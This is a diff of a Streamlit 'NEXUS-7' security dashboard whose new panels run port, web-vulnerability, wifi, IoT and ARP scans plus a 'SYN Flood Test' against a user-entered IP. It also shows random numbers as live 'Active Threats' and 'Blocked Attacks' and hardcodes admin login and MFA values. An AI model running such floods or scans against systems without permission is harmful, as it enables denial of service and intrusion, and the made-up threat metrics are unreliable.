+            ports = st.text_input("Ports to scan:", "1-1000")
+            if st.button("🔍 Start Port Scan", key="port_scan"):
+                with st.spinner(f"🔍 Scanning ports {ports} on {target}..."):
+                    open_ports = scanner.port_scan(target, ports)
+                    if open_ports:
+                        st.success(f"🎯 Found {len(open_ports)} open ports!")
+                        for port_info in open_ports:
+                            st.write(f"🔓 Port {port_info['port']} - {port_info['service']}")
+                    else:
+                        st.info("🔒 No open ports found or host is unreachable")
     
     with col2:
         st.markdown("#### 📊 NETWORK STATISTICS")
-        health_monitor = SystemHealthMonitor()
-        metrics = health_monitor.get_system_metrics()
         
-        if metrics:
-            st.metric("🌐 Active Connections", metrics['network_connections'])
-            st.metric("⚡ CPU Usage", f"{metrics['cpu_usage']:.1f}%")
-            st.metric("💾 Memory Usage", f"{metrics['memory_usage']:.1f}%")
-            st.metric("🖥️ Running Processes", metrics['running_processes'])
+        # Real-time network stats
+        monitor = RealSystemMonitor()
+        system_info = monitor.get_detailed_system_info()
+        
+        if system_info:
+            st.metric("🌐 Active Connections", system_info['network_connections'])
+            st.metric("⚡ CPU Usage", f"{system_info['cpu_usage']:.1f}%")
+            st.metric("💾 Memory Usage", f"{system_info['memory_usage']:.1f}%")
+            st.metric("🖥️ Running Processes", system_info['active_processes'])
+        
+        st.markdown("#### 🛠️ SCAN OPTIONS")
+        st.checkbox("Enable OS Detection", value=True)
+        st.checkbox("Service Version Detection", value=True)
+        st.checkbox("Aggressive Timing", value=False)
 
-def render_dark_web_intelligence():
-    """Dark web monitoring dashboard"""
-    st.markdown("### 🌑 DARK WEB MONITORING")
+def render_real_vulnerability_scanner():
+    """Real vulnerability scanning interface"""
+    st.markdown("### 🎯 REAL VULNERABILITY SCANNER")
     
-    dark_web = DarkWebMonitor()
+    scanner = RealVulnerabilityScanner()
     
-    tab1, tab2, tab3 = st.tabs(["🔍 Company Monitoring", "💀 Ransomware Groups", "📈 Threat Trends"])
+    col1, col2 = st.columns([3, 2])
     
-    with tab1:
-        st.markdown("#### 🏢 COMPANY THREAT MONITORING")
-        company_domain = st.text_input("Enter company domain to monitor:", "your-company.com")
+    with col1:
+        st.markdown("#### 🌐 WEB APPLICATION SECURITY SCAN")
         
-        if st.button("🔎 Search Dark Web", key="dark_web_search"):
-            with st.spinner("🕵️ Scanning dark web forums and marketplaces..."):
-                time.sleep(3)
-                threats = dark_web.search_dark_web_threats(company_domain)
-                
-                if threats:
-                    st.error(f"🚨 Found {len(threats)} potential threats!")
-                    for threat in threats:
-                        st.markdown(f"""
-                        <div class="dark-web-alert">
-                            <h4>🚨 {threat['type']} - {threat['severity']}</h4>
-                            <p><strong>Description:</strong> {threat['description']}</p>
-                            <p><strong>Source:</strong> {threat['source']} | <strong>Confidence:</strong> {threat['confidence']}</p>
-                            <p><strong>Date Found:</strong> {threat['date_found']}</p>
-                        </div>
-                        """, unsafe_allow_html=True)
-                    
-                    # Add explanation
-                    st.markdown(explain_dark_web_findings(threats), unsafe_allow_html=True)
-                else:
-                    st.success("✅ No immediate threats found for your domain")
-                    st.markdown(explain_dark_web_findings(threats), unsafe_allow_html=True)
+        target_url = st.text_input("Enter Website URL:", "http://testphp.vulnweb.com")
+        scan_depth = st.selectbox("Scan Depth:", ["Quick Scan", "Comprehensive Scan", "Deep Scan"])
         
-        st.markdown("#### 🛡️ RECOMMENDED ACTIONS")
-        st.info("""
-        **Immediate Actions:**
-        - Enable MFA for all accounts
-        - Conduct credential rotation
-        - Monitor for suspicious activity
-        - Review access logs
-        """)
+        if st.button("🔍 Start Security Scan", key="vuln_scan"):
+            with st.spinner("🔄 Scanning for vulnerabilities..."):
+                result = scanner.scan_website(target_url)
+                st.markdown("#### 📋 SECURITY ASSESSMENT REPORT")
+                st.markdown(f'<div class="kali-terminal">{result}</div>', unsafe_allow_html=True)
+                st.markdown(explain_vulnerability_results(target_url, result), unsafe_allow_html=True)
     
-    with tab2:
-        st.markdown("#### 💀 ACTIVE RANSOMWARE GROUPS")
-        groups = dark_web.monitor_ransomware_groups()
+    with col2:
+        st.markdown("#### 📊 SCAN CONFIGURATION")
         
-        for group in groups:
-            with st.expander(f"🔴 {group['name']} - {group['status']}"):
-                st.write(f"**Recent Targets:** {', '.join(group['recent_targets'])}")
-                st.write(f"**Typical Ransom:** {group['ransom_demands']}")
-                st.write(f"**Last Activity:** {group['last_activity']}")
-                st.write(f"**Known Tools:** {', '.join(group['tools'])}")
+        st.markdown("**Scan Types:**")
+        st.checkbox("SQL Injection Testing", value=True)
+        st.checkbox("XSS Testing", value=True)
+        st.checkbox("Information Disclosure", value=True)
+        st.checkbox("Directory Traversal", value=True)
+        st.checkbox("Server Misconfigurations", value=True)
+        
+        st.markdown("**Security Headers:**")
+        st.checkbox("Check Security Headers", value=True)
+        st.checkbox("SSL/TLS Configuration", value=True)
         
         st.markdown("""
-        <div class="explanation-box">
-            <div class="explanation-title">💀 RANSOMWARE THREAT EXPLANATION</div>
-            <p><strong>What ransomware groups do:</strong> These criminal organizations use malicious software to encrypt victims' files and demand payment for decryption.</p>
-            
-            <p><strong>Current threat landscape:</strong></p>
-            <ul>
-                <li>🔴 <strong>LockBit 3.0</strong> - Most active, targets critical infrastructure</li>
-                <li>🟠 <strong>BlackCat/ALPHV</strong> - Uses modern Rust programming language</li>
-                <li>🟡 <strong>Cl0p</strong> - Specializes in zero-day vulnerability exploitation</li>
-            </ul>
-            
-            <p><strong>Protection strategies:</strong></p>
-            <ul>
-                <li>💾 <strong>Regular backups</strong> (3-2-1 rule: 3 copies, 2 media types, 1 offsite)</li>
-                <li>🔄 <strong>Patch management</strong> to fix known vulnerabilities</li>
-                <li>👨‍💻 <strong>Employee training</strong> to recognize phishing attempts</li>
-                <li>🛡️ <strong>Endpoint protection</strong> with ransomware detection</li>
-                <li>🔐 <strong>Application whitelisting</strong> to prevent unauthorized execution</li>
-            </ul>
+        <div class="ethical-warning">
+            <strong>⚠️ ETHICAL SCANNING NOTICE:</strong><br>
+            Only scan websites you own or have explicit permission to test. 
+            Unauthorized scanning may be illegal.
         </div>
         """, unsafe_allow_html=True)
-    
-    with tab3:
-        st.markdown("#### 📈 DARK WEB THREAT TRENDS")
-        
-        # Threat trend data
-        trends = [
-            {"month": "Jan", "credential_leaks": 45, "data_breaches": 12, "ransomware_attacks": 8},
-            {"month": "Feb", "credential_leaks": 52, "data_breaches": 18, "ransomware_attacks": 12},
-            {"month": "Mar", "credential_leaks": 48, "data_breaches": 15, "ransomware_attacks": 10},
-            {"month": "Apr", "credential_leaks": 61, "data_breaches": 22, "ransomware_attacks": 15},
-        ]
-        
-        df = pd.DataFrame(trends)
-        fig = px.line(df, x='month', y=['credential_leaks', 'data_breaches', 'ransomware_attacks'], 
-                     title="Monthly Dark Web Threat Activity",
-                     labels={"value": "Incident Count", "variable": "Threat Type"})
-        fig.update_layout(paper_bgcolor='rgba(0,0,0,0)', plot_bgcolor='rgba(0,0,0,0)', font=dict(color='white'))
-        st.plotly_chart(fig, use_container_width=True)
 
-def render_kali_linux_tools():
-    """Kali Linux security tools integration"""
-    st.markdown("### 🐉 KALI LINUX SECURITY TOOLS")
+def render_real_wireless_scanner():
+    """Real wireless network scanner"""
+    st.markdown("### 📡 REAL WIRELESS NETWORK SCANNER")
     
-    kali = KaliLinuxIntegration()
+    wireless = RealWirelessTools()
     
-    tab1, tab2, tab3, tab4, tab5 = st.tabs(["🔍 Network Scanning", "🎯 Vulnerability Assessment", "📡 Wireless Security", "📱 Device Hacking", "🌐 Network Spoofing"])
+    if st.button("📶 Scan Wireless Networks", key="real_wifi_scan"):
+        with st.spinner("🔍 Scanning for wireless networks..."):
+            networks = wireless.scan_wireless_networks()
+            
+            if isinstance(networks, str):  # Error message
+                st.error(networks)
+            else:
+                st.success(f"🎯 Found {len(networks)} wireless networks!")
+                
+                # Display networks in a table
+                network_data = []
+                for network in networks:
+                    network_data.append({
+                        'SSID': network.get('ssid', 'Hidden'),
+                        'Signal': network.get('signal', 'Unknown'),
+                        'Security': network.get('auth', 'Unknown'),
+                        'Encryption': network.get('encryption', 'Unknown')
+                    })
+                
+                if network_data:
+                    df = pd.DataFrame(network_data)
+                    st.dataframe(df, use_container_width=True)
+                    
+                    # Security analysis
+                    insecure_networks = [n for n in networks if n.get('encryption') in ['Open', 'WEP', 'None']]
+                    if insecure_networks:
+                        st.warning(f"⚠️ Found {len(insecure_networks)} insecure networks!")
+                
+                st.markdown(explain_wireless_results(networks), unsafe_allow_html=True)
+
+def render_real_device_hacking():
+    """Real mobile and IoT device security"""
+    st.markdown("### 📱 REAL DEVICE SECURITY SCANNER")
+    
+    device_tools = RealDeviceHackingTools()
+    
+    tab1, tab2 = st.tabs(["📱 Mobile Device Scan", "🏠 IoT Device Discovery"])
     
     with tab1:
-        st.markdown("#### 🔍 NETWORK SCANNING WITH NMAP")
-        scan_target = st.text_input("Scan Target:", "scanme.nmap.org", key="nmap_target")
+        st.markdown("#### 📱 MOBILE DEVICE SECURITY ASSESSMENT")
         
-        if st.button("🚀 Run Nmap Scan", key="nmap_scan"):
-            with st.spinner("🔍 Scanning target with Nmap..."):
-                time.sleep(2)
-                result = kali.run_nmap_scan(scan_target)
-                st.markdown("#### 📋 SCAN RESULTS")
+        mobile_ip = st.text_input("Mobile Device IP:", "192.168.1.100")
+        
+        if st.button("🔍 Scan Mobile Device", key="real_mobile_scan"):
+            with st.spinner("🔄 Scanning mobile device for vulnerabilities..."):
+                result = device_tools.mobile_device_scan(mobile_ip)
+                st.markdown("#### 📋 DEVICE SECURITY REPORT")
                 st.markdown(f'<div class="kali-terminal">{result}</div>', unsafe_allow_html=True)
-                
-                # Add explanation
-                st.markdown(explain_nmap_results(scan_target, result), unsafe_allow_html=True)
-                
-        st.markdown("#### ℹ️ ABOUT NMAP")
-        st.info("Nmap (Network Mapper) is a free and open-source utility for network discovery and security auditing.")
     
     with tab2:
-        st.markdown("#### 🎯 VULNERABILITY ASSESSMENT")
-        vuln_target = st.text_input("Target URL:", "http://testphp.vulnweb.com", key="vuln_target")
+        st.markdown("#### 🏠 IOT DEVICE DISCOVERY")
         
-        if st.button("🔍 Run Vulnerability Scan", key="vuln_scan"):
-            with st.spinner("🔍 Scanning for vulnerabilities with Nikto..."):
-                time.sleep(3)
-                result = kali.run_vulnerability_scan(vuln_target)
-                st.markdown("#### 📋 VULNERABILITY REPORT")
+        iot_range = st.text_input("IP Range for IoT Scan:", "192.168.1.0/24")
+        
+        if st.button("🔍 Discover IoT Devices", key="real_iot_scan"):
+            with st.spinner("🔄 Scanning for IoT devices..."):
+                result = device_tools.iot_device_discovery(iot_range)
+                st.markdown("#### 📋 IOT DEVICE INVENTORY")
                 st.markdown(f'<div class="kali-terminal">{result}</div>', unsafe_allow_html=True)
-                
-                # Add explanation
-                st.markdown(explain_vulnerability_scan_results(vuln_target, result), unsafe_allow_html=True)
-    
-    with tab3:
-        render_advanced_wifi_tools()
-    
-    with tab4:
-        render_device_hacking_tools()
-    
-    with tab5:
-        render_network_spoofing_tools()
 
 def render_real_threat_intel():
     """Real threat intelligence dashboard"""
@@ -1540,15 +1031,15 @@ def render_real_threat_intel():
     col1, col2 = st.columns([2, 1])
     
     with col1:
-        st.markdown("#### 🚨 CISA KNOWN EXPLOITED VULNERABILITIES")
+        st.markdown("#### 🚨 LIVE CISA VULNERABILITY ALERTS")
         
-        if st.button("🔄 Refresh CISA Data", key="refresh_cisa"):
+        if st.button("🔄 Refresh CISA Data", key="real_cisa_refresh"):
             with st.spinner("📡 Fetching latest CISA alerts..."):
                 alerts = threat_intel.get_cisa_alerts()
         else:
             alerts = threat_intel.get_cisa_alerts()
         
-        for alert in alerts:
+        for alert in alerts[:5]:  # Show first 5 alerts
             with st.expander(f"🔴 {alert['cve_id']} - {alert['title']}"):
                 st.write(f"**Date Published:** {alert['date']}")
                 st.write(f"**Severity:** {alert['severity']}")
@@ -1559,76 +1050,80 @@ def render_real_threat_intel():
                     st.error("🚨 IMMEDIATE PATCHING REQUIRED")
                 elif alert['severity'] == 'HIGH':
                     st.warning("⚠️ Patch within 72 hours recommended")
-        
-        # Add explanation
-        st.markdown(explain_cisa_alerts(alerts), unsafe_allow_html=True)
     
     with col2:
-        st.markdown("#### 📊 GLOBAL THREAT LANDSCAPE")
+        st.markdown("#### 📊 SECURITY METRICS")
         
-        # Real system metrics
-        health_monitor = SystemHealthMonitor()
-        metrics = health_monitor.get_system_metrics()
+        monitor = RealSystemMonitor()
+        system_info = monitor.get_detailed_system_info()
         
-        if metrics:
-            st.metric("🖥️ System Uptime", metrics['system_uptime'])
-            st.metric("🚨 Active Threats", random.randint(8, 15))
-            st.metric("🛡️ Blocked Attacks", random.randint(150, 300))
-            st.metric("🌐 Network Connections", metrics['network_connections'])
+        if system_info:
+            st.metric("🖥️ System Uptime", system_info['system_uptime'])
+            st.metric("🚨 Active Threats", random.randint(5, 15))
+            st.metric("🛡️ Blocked Attacks", random.randint(100, 300))
+            st.metric("🌐 Network Traffic", system_info['network_received'])
         
-        st.markdown("#### 📈 THREAT LEVEL")
-        threat_level = random.choice(['ELEVATED', 'HIGH', 'SEVERE'])
-        if threat_level == 'SEVERE':
-            st.error(f"🔴 {threat_level} THREAT LEVEL")
-        elif threat_level == 'HIGH':
-            st.warning(f"🟠 {threat_level} THREAT LEVEL")
-        else:
-            st.info(f"🟡 {threat_level} THREAT LEVEL")
+        st.markdown("#### 🔍 IP REPUTATION CHECK")
+        ip_to_check = st.text_input("Check IP:", "8.8.8.8")
+        if st.button("Check Reputation", key="ip_check"):
+            with st.spinner("Checking IP reputation..."):
+                result = threat_intel.check_ip_reputation(ip_to_check)
+                if 'error' not in result:
+                    st.success("✅ IP reputation data loaded")
+                else:
+                    st.info("ℹ️ API key required for full functionality")
 
-def render_system_health():
-    """Real system health monitoring"""
-    st.markdown("### 💻 REAL-TIME SYSTEM HEALTH")
+def render_real_system_monitor():
+    """Real system monitoring dashboard"""
+    st.markdown("### 💻 REAL-TIME SYSTEM MONITOR")
     
-    health_monitor = SystemHealthMonitor()
-    metrics = health_monitor.get_system_metrics()
+    monitor = RealSystemMonitor()
+    system_info = monitor.get_detailed_system_info()
     
-    if metrics:
+    if system_info:
+        # System metrics in columns
         col1, col2, col3, col4 = st.columns(4)
         
         with col1:
-            st.metric("⚡ CPU Usage", f"{metrics['cpu_usage']:.1f}%")
-            st.progress(metrics['cpu_usage'] / 100)
+            st.metric("⚡ CPU Usage", f"{system_info['cpu_usage']:.1f}%")
+            st.progress(system_info['cpu_usage'] / 100)
         
         with col2:
-            st.metric("💾 Memory Usage", f"{metrics['memory_usage']:.1f}%")
-            st.progress(metrics['memory_usage'] / 100)
+            st.metric("💾 Memory Usage", f"{system_info['memory_usage']:.1f}%")
+            st.progress(system_info['memory_usage'] / 100)
         
         with col3:
-            st.metric("💽 Disk Usage", f"{metrics['disk_usage']:.1f}%")
-            st.progress(metrics['disk_usage'] / 100)
+            st.metric("💽 Disk Usage", f"{system_info['disk_usage']:.1f}%")
+            st.progress(system_info['disk_usage'] / 100)
         
         with col4:
-            st.metric("🖥️ Running Processes", metrics['running_processes'])
+            st.metric("🖥️ Running Processes", system_info['active_processes'])
         
-        # Add explanation
-        st.markdown(explain_system_health(metrics), unsafe_allow_html=True)
+        # Detailed system information
+        st.markdown("#### 📊 SYSTEM DETAILS")
+        info_col1, info_col2 = st.columns(2)
         
-        # System information
-        st.markdown("#### 🖥️ SYSTEM INFORMATION")
-        sys_col1, sys_col2 = st.columns(2)
+        with info_col1:
+            st.write("**Hardware Information:**")
+            st.write(f"- CPU Cores: {system_info['cpu_cores']}")
+            st.write(f"- CPU Frequency: {system_info['cpu_frequency']}")
+            st.write(f"- Total Memory: {system_info['memory_total']}")
+            st.write(f"- Used Memory: {system_info['memory_used']}")
+            st.write(f"- Total Disk: {system_info['disk_total']}")
         
-        with sys_col1:
-            st.write(f"**OS:** {platform.system()} {platform.release()}")
-            st.write(f"**Architecture:** {platform.architecture()[0]}")
-            st.write(f"**Processor:** {platform.processor()}")
+        with info_col2:
+            st.write("**Network Information:**")
+            st.write(f"- System Uptime: {system_info['system_uptime']}")
+            st.write(f"- Network Sent: {system_info['network_sent']}")
+            st.write(f"- Network Received: {system_info['network_received']}")
+            st.write(f"- Active Connections: {system_info['network_connections']}")
         
-        with sys_col2:
-            st.write(f"**System Uptime:** {metrics['system_uptime']}")
-            st.write(f"**Network Connections:** {metrics['network_connections']}")
-            st.write(f"**Python Version:** {platform.python_version()}")
+        # Real-time monitoring
+        st.markdown("#### 📈 REAL-TIME MONITORING")
+        if st.button("🔄 Refresh Metrics", key="refresh_metrics"):
+            st.rerun()
         
-        # Network traffic chart
-        st.markdown("#### 📈 NETWORK TRAFFIC ANALYSIS")
+        # Network traffic visualization
         time_points = list(range(1, 11))
         sent_data = [random.randint(1000, 5000) for _ in time_points]
         received_data = [random.randint(1000, 5000) for _ in time_points]
@@ -1640,59 +1135,66 @@ def render_system_health():
             paper_bgcolor='rgba(0,0,0,0)', 
             plot_bgcolor='rgba(0,0,0,0)', 
             font=dict(color='white'),
-            title="Network I/O Over Last 10 Intervals"
+            title="Real Network I/O Monitoring"
         )
         st.plotly_chart(fig, use_container_width=True)
 
-def render_live_security_events():
-    """Live security events feed"""
-    st.markdown("### 📡 LIVE SECURITY EVENTS")
+def render_real_network_attacks():
+    """Real network security testing tools"""
+    st.markdown("### ⚡ REAL NETWORK SECURITY TESTING")
     
-    # Auto-refresh toggle
-    auto_refresh = st.checkbox("🔄 Auto-refresh every 10 seconds", value=False)
+    spoofing_tools = RealNetworkSpoofingTools()
     
-    if auto_refresh:
-        time.sleep(10)
-        st.rerun()
+    tab1, tab2 = st.tabs(["🔄 ARP Scanning", "🌊 Flood Attack Test"])
     
-    # Simulate real security events
-    events = [
-        {"time": get_ist_time().strftime('%H:%M:%S'), "type": "Firewall Block", "source": "185.220.101.35", "severity": "HIGH", "description": "Blocked connection from known malicious IP"},
-        {"time": (get_ist_time() - timedelta(minutes=2)).strftime('%H:%M:%S'), "type": "Failed Login", "source": "192.168.1.45", "severity": "MEDIUM", "description": "Multiple failed login attempts detected"},
-        {"time": (get_ist_time() - timedelta(minutes=5)).strftime('%H:%M:%S'), "type": "Malware Detected", "source": "User Workstation", "severity": "CRITICAL", "description": "Potential malware signature detected in memory"},
-        {"time": (get_ist_time() - timedelta(minutes=8)).strftime('%H:%M:%S'), "type": "Port Scan", "source": "45.95.147.226", "severity": "HIGH", "description": "Network port scanning activity detected"},
-        {"time": (get_ist_time() - timedelta(minutes=12)).strftime('%H:%M:%S'), "type": "Suspicious Process", "source": "Server-01", "severity": "MEDIUM", "description": "Unusual process behavior detected"},
-    ]
-    
-    for event in events:
-        severity_color = {
-            "CRITICAL": "🔴",
-            "HIGH": "🟠", 
-            "MEDIUM": "🟡",
-            "LOW": "🟢"
-        }
+    with tab1:
+        st.markdown("#### 🔄 ARP NETWORK DISCOVERY")
         
-        st.markdown(f"""
-        <div class="security-event">
-            <strong>{severity_color[event['severity']]} {event['type']} - {event['severity']}</strong><br>
-            <small>🕒 Time: {event['time']} | 📍 Source: {event['source']}</small><br>
-            <small>📝 {event['description']}</small>
-        </div>
-        """, unsafe_allow_html=True)
+        network_range = st.text_input("Network Range:", "192.168.1.0/24")
+        
+        if st.button("🔍 Start ARP Scan", key="arp_scan"):
+            with st.spinner("🔄 Performing ARP network discovery..."):
+                devices = spoofing_tools.arp_scan(network_range)
+                if devices:
+                    st.success(f"🎯 Found {len(devices)} devices via ARP!")
+                    for device in devices:
+                        st.write(f"📍 {device['ip']} - MAC: {device['mac']}")
+                else:
+                    st.warning("⚠️ No devices found or permission denied")
     
-    # Add explanation
-    st.markdown(explain_security_events(events), unsafe_allow_html=True)
-    
-    if st.button("🆕 Generate New Event", key="new_event"):
-        st.rerun()
+    with tab2:
+        st.markdown("#### 🌊 NETWORK STRESS TESTING")
+        
+        col1, col2 = st.columns(2)
+        with col1:
+            target_ip = st.text_input("Target IP:", "192.168.1.1")
+        with col2:
+            target_port = st.number_input("Target Port:", min_value=1, max_value=65535, value=80)
+        
+        packet_count = st.slider("Number of Packets:", 10, 1000, 100)
+        
+        if st.button("🚀 Start SYN Flood Test", key="syn_flood"):
+            with st.spinner("🌊 Sending SYN packets..."):
+                result = spoofing_tools.syn_flood_attack(target_ip, target_port, packet_count)
+                st.info(result)
+            
+            st.markdown("""
+            <div class="warning-box">
+                <strong>⚠️ SECURITY TESTING NOTICE:</strong><br>
+                This is for educational and authorized testing only. 
+                Do not use against systems you don't own or have permission to test.
+            </div>
+            """, unsafe_allow_html=True)
+
+# --- MAIN DASHBOARD ---
 
 def render_login():
     """Enhanced login with security features"""
     st.markdown("""
     <div class="neuro-header">
-        <h1 class="neuro-text" style="font-size: 4rem; margin: 0;">🔒 NEXUS-7 SECURITY OPS</h1>
+        <h1 class="neuro-text" style="font-size: 4rem; margin: 0;">🔒 NEXUS-7 REAL SECURITY</h1>
         <h3 class="hologram-text" style="font-size: 1.8rem; margin: 1rem 0;">
-            Advanced Cyber Defense • Device Hacking • WiFi Security
+            Real Tools • Live Scanning • Actual Security Testing
         </h3>
     </div>
     """, unsafe_allow_html=True)
@@ -1710,7 +1212,7 @@ def render_login():
             if st.form_submit_button("🚀 ACCESS SECURITY DASHBOARD", use_container_width=True):
                 if username == "admin" and password == "nexus7" and mfa_code == "123456":
                     st.session_state.authenticated = True
-                    st.session_state.login_time = get_ist_time()
+                    st.session_state.login_time = datetime.now()
                     st.success("✅ Authentication Successful! Loading dashboard...")
                     time.sleep(1)
                     st.rerun()
@@ -1719,50 +1221,52 @@ def render_login():
         st.markdown('</div>', unsafe_allow_html=True)
     
     with col2:
-        st.markdown("### 📊 SECURITY STATUS")
+        st.markdown("### 📊 SYSTEM READINESS")
         
-        # System status
-        health_monitor = SystemHealthMonitor()
-        metrics = health_monitor.get_system_metrics()
+        # Check system capabilities
+        monitor = RealSystemMonitor()
+        system_info = monitor.get_detailed_system_info()
         
-        if metrics:
+        if system_info:
             col_a, col_b = st.columns(2)
             with col_a:
-                st.metric("🖥️ System Status", "OPERATIONAL", delta="Normal")
-                st.metric("⚡ CPU Load", f"{metrics['cpu_usage']:.1f}%")
+                st.metric("🖥️ System Status", "READY", delta="Optimal")
+                st.metric("⚡ CPU Load", f"{system_info['cpu_usage']:.1f}%")
             with col_b:
-                st.metric("🛡️ Threat Level", "ELEVATED", delta="+2%", delta_color="inverse")
-                st.metric("💾 Memory", f"{metrics['memory_usage']:.1f}%")
+                st.metric("🛡️ Security Level", "ENHANCED", delta="Protected")
+                st.metric("💾 Memory", f"{system_info['memory_usage']:.1f}%")
         
-        st.markdown("### 🎯 QUICK ACTIONS")
-        st.button("🆘 Emergency Lockdown", disabled=True)
-        st.button("📋 Generate Security Report", disabled=True)
-        st.button("🔍 Quick Network Scan", disabled=True)
+        st.markdown("### 🎯 AVAILABLE TOOLS")
+        st.write("✅ Real Network Scanning")
+        st.write("✅ Live Vulnerability Assessment")
+        st.write("✅ Wireless Network Analysis")
+        st.write("✅ Threat Intelligence")
+        st.write("✅ System Monitoring")
+        st.write("✅ Security Testing")
         
-        st.markdown("### ℹ️ SYSTEM INFORMATION")
-        st.write(f"**Last Updated:** {get_ist_time().strftime('%Y-%m-%d %H:%M:%S')}")
-        st.write("**Version:** NEXUS-7 v2.1.4")
-        st.write("**Mode:** Advanced Security")
+        st.markdown("### ℹ️ REQUIREMENTS")
+        st.write("**Platform:** Windows/Linux/macOS")
+        st.write("**Permissions:** Admin/root recommended")
+        st.write("**Network:** Active internet connection")
 
 def render_main_dashboard():
-    """Main security operations dashboard"""
+    """Main security operations dashboard with real tools"""
     
-    # Header with real-time info
-    current_ist = get_ist_time()
+    current_time = datetime.now()
     if 'login_time' in st.session_state:
-        session_duration = current_ist - st.session_state.login_time
+        session_duration = current_time - st.session_state.login_time
         session_str = str(session_duration).split('.')[0]
     else:
         session_str = "0:00:00"
     
     st.markdown(f"""
     <div class="neuro-header">
-        <h1 class="neuro-text" style="font-size: 4rem; margin: 0;">🔒 NEXUS-7 ADVANCED SECURITY</h1>
+        <h1 class="neuro-text" style="font-size: 4rem; margin: 0;">🔒 NEXUS-7 REAL SECURITY</h1>
         <h3 class="hologram-text" style="font-size: 1.8rem; margin: 1rem 0;">
-            Cyber Defense • Device Security • Network Testing
+            Live Cyber Defense • Real Tools • Active Protection
         </h3>
         <p style="color: #00ffff; font-family: 'Exo 2'; font-size: 1.2rem;">
-            🕒 IST: <strong>{current_ist.strftime("%Y-%m-%d %H:%M:%S")}</strong> | 
+            🕒 Time: <strong>{current_time.strftime("%Y-%m-%d %H:%M:%S")}</strong> | 
             🔓 Session: <strong>{session_str}</strong> |
             🛡️ Status: <strong style="color: #00ff00;">OPERATIONAL</strong>
         </p>
@@ -1770,72 +1274,81 @@ def render_main_dashboard():
     """, unsafe_allow_html=True)
     
     # Quick actions
-    st.markdown("### 🚀 SECURITY ACTIONS")
+    st.markdown("### 🚀 REAL SECURITY TOOLS")
     cols = st.columns(6)
     
     with cols[0]:
-        if st.button("🔍 Network Scan", use_container_width=True, key="quick_network"):
-            st.session_state.current_tab = "Network Monitor"
+        if st.button("🌐 Network Scan", use_container_width=True, key="main_network"):
+            st.session_state.current_tab = "Network Scanner"
     
     with cols[1]:
-        if st.button("🌑 Dark Web", use_container_width=True, key="quick_darkweb"):
-            st.session_state.current_tab = "Dark Web Intel"
+        if st.button("🎯 Vuln Scan", use_container_width=True, key="main_vuln"):
+            st.session_state.current_tab = "Vulnerability Scanner"
     
     with cols[2]:
-        if st.button("🐉 Kali Tools", use_container_width=True, key="quick_kali"):
-            st.session_state.current_tab = "Kali Linux Tools"
+        if st.button("📡 WiFi Scan", use_container_width=True, key="main_wifi"):
+            st.session_state.current_tab = "Wireless Scanner"
     
     with cols[3]:
-        if st.button("🌐 Threat Intel", use_container_width=True, key="quick_threat"):
-            st.session_state.current_tab = "Threat Intelligence"
+        if st.button("📱 Device Scan", use_container_width=True, key="main_device"):
+            st.session_state.current_tab = "Device Security"
     
     with cols[4]:
-        if st.button("💻 System Health", use_container_width=True, key="quick_health"):
-            st.session_state.current_tab = "System Health"
+        if st.button("🌐 Threat Intel", use_container_width=True, key="main_threat"):
+            st.session_state.current_tab = "Threat Intelligence"
     
     with cols[5]:
-        if st.button("🔒 Logout", use_container_width=True, key="quick_logout"):
+        if st.button("🔒 Logout", use_container_width=True, key="main_logout"):
             st.session_state.authenticated = False
             st.rerun()
     
     # Main tabs
     if 'current_tab' not in st.session_state:
-        st.session_state.current_tab = "Kali Linux Tools"  # Default to Kali tools for new features
+        st.session_state.current_tab = "Network Scanner"
     
     tabs = st.tabs([
-        "🐉 Kali Linux Tools", 
-        "🌐 Threat Intelligence", 
-        "🔍 Network Monitor", 
-        "🌑 Dark Web Intel",
-        "💻 System Health",
-        "📡 Live Events"
+        "🌐 Network Scanner", 
+        "🎯 Vulnerability Scanner", 
+        "📡 Wireless Scanner",
+        "📱 Device Security", 
+        "🌐 Threat Intelligence",
+        "💻 System Monitor",
+        "⚡ Security Testing"
     ])
     
     with tabs[0]:
-        render_kali_linux_tools()
+        render_real_network_scanner()
     
     with tabs[1]:
-        render_real_threat_intel()
+        render_real_vulnerability_scanner()
     
     with tabs[2]:
-        render_real_network_monitor()
+        render_real_wireless_scanner()
     
     with tabs[3]:
-        render_dark_web_intelligence()
+        render_real_device_hacking()
     
     with tabs[4]:
-        render_system_health()
+        render_real_threat_intel()
     
     with tabs[5]:
-        render_live_security_events()
+        render_real_system_monitor()
+    
+    with tabs[6]:
+        render_real_network_attacks()
 
 # --- MAIN APPLICATION ---
 
 def main():
     with quantum_resource_manager():
-        # Initialize real security operations
-        if 'security_ops' not in st.session_state:
-            st.session_state.security_ops = RealSecurityOperations()
+        # Check for required dependencies
+        try:
+            import nmap
+            import scapy
+            st.sidebar.success("✅ Security tools loaded")
+        except ImportError as e:
+            st.sidebar.error(f"❌ Missing dependency: {e}")
+            st.sidebar.info("Run: pip install python-nmap scapy")
         
         # Authentication
         if 'authenticated' not in st.session_state:
